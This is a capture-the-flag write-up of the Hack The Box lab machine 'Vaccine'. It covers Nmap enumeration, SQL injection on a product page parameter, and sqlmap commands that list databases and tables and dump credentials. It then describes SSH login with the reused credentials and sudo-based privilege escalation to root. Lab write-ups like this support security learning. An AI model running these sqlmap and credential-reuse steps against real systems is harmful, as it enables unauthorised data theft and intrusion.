# Hack The Box — Vaccine

> **Difficulty:** Easy
> **Platform:** Hack The Box
> **Focus:** Web Enumeration · SQL Injection · SQLmap · PostgreSQL · SSH · Privilege Escalation

## Overview

Vaccine is an Easy Linux machine that demonstrates how a vulnerable web application can lead to database access and eventually system compromise.

### Attack Chain

```text
Web Enumeration
      ↓
SQL Injection
      ↓
SQLmap
      ↓
PostgreSQL Database
      ↓
Credential Discovery
      ↓
SSH Access
      ↓
Privilege Escalation
      ↓
Root
```

---

## 1. Enumeration

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV <TARGET_IP>
```

The scan revealed several services, including:

* SSH
* HTTP

The HTTP service was the main attack surface, so I moved on to web enumeration.

---

## 2. Web Enumeration

I visited the web server and inspected the application.

The website contained a product page with an `id` parameter, making it worth testing for SQL injection.

Example:

```text
http://<TARGET_IP>/products.php?id=5
```

I tested the parameter to determine whether user-controlled input was being passed directly into a SQL query.

---

## 3. SQL Injection

The parameter was vulnerable to SQL injection.

Instead of manually enumerating the database, I used **SQLmap** to automate the process.

Initial command:

```bash
sqlmap -u "http://<TARGET_IP>/products.php?id=5"
```

I then specified the database management system when necessary:

```bash
sqlmap -u "http://<TARGET_IP>/products.php?id=5" --dbms=PostgreSQL
```

### Enumerating Databases

After confirming the injection, I enumerated the available databases.

```bash
sqlmap -u "http://<TARGET_IP>/products.php?id=5" --dbs
```

I identified the relevant application database and enumerated its tables:

```bash
sqlmap -u "http://<TARGET_IP>/products.php?id=5" -D <DATABASE> --tables
```

I then dumped the relevant table:

```bash
sqlmap -u "http://<TARGET_IP>/products.php?id=5" -D <DATABASE> -T <TABLE> --dump
```

This exposed credentials that could potentially be reused for system access.

---

## 4. SSH Access

With valid credentials discovered during database enumeration, I attempted to authenticate over SSH.

```bash
ssh <USERNAME>@<TARGET_IP>
```

The credentials worked, providing an interactive shell on the target.

I then began enumerating the system and checking the privileges available to the compromised user.

---

## 5. Privilege Escalation

I checked the user's sudo privileges:

```bash
sudo -l
```

This revealed a way to execute a command with elevated privileges.

I investigated the permitted command and identified a method to abuse it for privilege escalation.

The key lesson here was that **sudo permissions should always be examined after obtaining a low-privileged shell**.

---

## 6. Root

After exploiting the available privilege escalation path, I obtained a root shell.

I verified the current user with:

```bash
whoami
```

The result confirmed:

```text
root
```

---

## 7. What I Learned

### SQL Injection

A parameter that directly influences a database query can become an entry point into the application and potentially the underlying system.

### SQLmap

I learned how SQLmap can automate:

* SQL injection detection
* Database enumeration
* Table enumeration
* Data extraction

Important options I used:

```text
-u              Target URL
--dbms          Specify database type
--dbs           Enumerate databases
-D              Select database
-T              Select table
--tables        Enumerate tables
--dump          Extract table contents
```

### Credential Reuse

Credentials discovered through a web application may also provide access to other services such as SSH.

### Linux Privilege Escalation

After gaining a shell, checking:

```bash
sudo -l
```

is an important part of privilege enumeration.

---

## 8. Tools Used

* Nmap
* SQLmap
* SSH
* Linux
* PostgreSQL

---

## 9. Key Takeaways

```text
Enumerate → Identify Injection → Exploit SQLi
          ↓
      Enumerate DB
          ↓
   Extract Credentials
          ↓
       SSH Access
          ↓
  Enumerate Privileges
          ↓
    Privilege Escalation
          ↓
          Root
```

> **Note:** Sensitive flags and machine answers are intentionally omitted.
